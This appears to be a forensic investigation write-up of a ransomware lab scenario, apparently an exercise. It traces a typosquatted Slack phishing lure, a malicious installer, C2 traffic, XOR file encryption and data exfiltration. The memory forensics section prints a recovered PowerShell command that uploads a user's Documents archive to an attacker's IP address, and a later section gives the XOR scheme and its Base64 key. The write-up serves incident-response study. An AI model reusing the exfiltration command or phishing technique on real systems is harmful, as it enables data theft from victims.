Funtech / ransomware investigation

A complete reconstruction of a ransomware intrusion: spear-phishing delivery, typosquatted software download, payload execution, C2 communication, file encryption and HTTP data exfiltration.

EXECUTIVE SUMMARY

What happened

The investigation began with a phishing email sent from no-reply@slakc.com. The attacker used the look-alike domain slakc.com to imitate Slack and direct the victim toward a malicious software update.

Browser artefacts showed a download from downloads.slakc.com. The downloaded executable was placed in a fake Slack installation path and subsequently launched the ransomware component SlakcService.exe.

Memory and network analysis established command-and-control communication with 104.244.42.193:7856. The ransomware encrypted the user's Desktop, Documents, Downloads, Music, Pictures and Videos directories.

The attacker then staged the Documents directory, created exfil.zip, and uploaded it over HTTP to /svc_slack.php. The server returned a generated filename and remote storage directory, providing direct confirmation of successful exfiltration.

ATTACK CHAIN

From phishing to exfiltration

01
INITIAL ACCESS

Spear-phishing email

The malicious message used no-reply@slakc.com. SMTP Received headers identified the sending infrastructure at 185.229.111.42, associated with AS210850.

02
DELIVERY

Typosquatted Slack update

The victim followed a link to downloads.slakc.com. The domain differs from legitimate slack.com, a classic typosquatting technique.

03
EXECUTION

Malicious installer

SlakcUpdate-4-44-65.exe was found at C:\Program Files (x86)\Slack\SlakcUpdate-4-44-65.exe. Its SHA-256 was 9971D9693EB6BABB29BF40CDEE54ECE4767CA477D57F3441D6B6BF4322E0B991.

04
COMMAND & CONTROL

Ransomware establishes C2

Volatility identified SlakcService.exe executing at 2025-06-27 08:56:53. PCAP analysis showed communication with 104.244.42.193:7856.

05
IMPACT

Directory encryption

The ransomware targeted six user directories: Desktop, Documents, Downloads, Music, Pictures and Videos. IDA analysis showed an XOR-based encryption routine using a repeating key.

06
COLLECTION & EXFILTRATION

Documents staged and uploaded

PowerShell copied Documents into exfil2zip, created exfil.zip, and sent it to http://104.244.42.193/svc_slack.php. The 24 MB HTTP POST was confirmed in Wireshark.

Exfiltration confirmed

WIRESHARK · TCP STREAM 73

The victim sent a 24,097,335-byte HTTP POST from 10.45.4.79 to 104.244.42.193:80.

POST /svc_slack.php HTTP/1.1
Host: 104.244.42.193
Content-Type: application/octet-stream
Content-Length: 24097335

The server returned HTTP/1.1 200 OK and reported:

This response establishes both the generated remote filename and the remote storage directory used by the exfiltration service.

MEMORY FORENSICS

Recovered attacker command

The console history was not sufficient on its own, so raw memory strings were searched for the C2 address and PowerShell transfer commands. This recovered the command responsible for uploading the staged archive.

powershell.exe -Command "Invoke-WebRequest -Uri 'http://104.244.42.193/svc_slack.php' -Method POST -InFile 'C:\Users\Matt Jarovic\Documents\exfil.zip' -ContentType 'application/octet-stream'"

REVERSE ENGINEERING

XOR encryption

IDA was used to trace the encryption routine. The function obtains the length of a key vector, divides the current byte index by that length, and uses the remainder to select a key byte.

The selected byte is XORed with the input byte and written back. Because the key index wraps using the modulo operation, the same key repeats across the file.

ALGORITHMcipher[i] = plaintext[i] XOR key[i % key_length]KEY SOURCEBase64 string → base64_decode() → _ZL3key
Recovered Base64 key material
4f2sG9m1Jq7P6bN3XvLkYz8QrVaTeWn0MdXJyPuEf3Q=

The binary's static initialization routine passes this Base64 value to the decoder before the resulting byte vector is used by the encryption function.

FINAL FINDINGS

Case conclusion

The evidence supports a continuous attack chain from phishing through ransomware impact and data theft. The attacker used a convincing Slack impersonation to deliver the initial executable, established C2 communications, executed a separate ransomware component, encrypted six user directories, staged Documents and exfiltrated a generated ZIP archive over HTTP.

Cross-correlation between email artefacts, browser history, memory, PCAP and reverse engineering was necessary to reconstruct the complete incident. The final recovered text document contained references to First National Bank and Global Wire Bank.
